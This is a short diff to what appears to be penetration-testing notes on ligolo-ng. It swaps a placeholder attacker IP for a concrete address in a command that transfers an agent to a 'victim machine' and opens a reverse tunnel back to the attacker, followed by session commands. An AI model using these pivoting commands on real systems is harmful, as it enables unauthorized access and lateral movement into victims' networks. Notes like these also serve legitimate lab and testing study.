@@ -44,7 +44,7 @@ ligolo-ng
 
 	Transfer the agent on the victim machine & start the connection
 	#Replace this with your attacker IP address.
-	./agent -connect 10.10.200.X:443 -ignore-cert
+	./agent -connect 10.10.200.124:443 -ignore-cert
 
 	session
 	list_tunnels
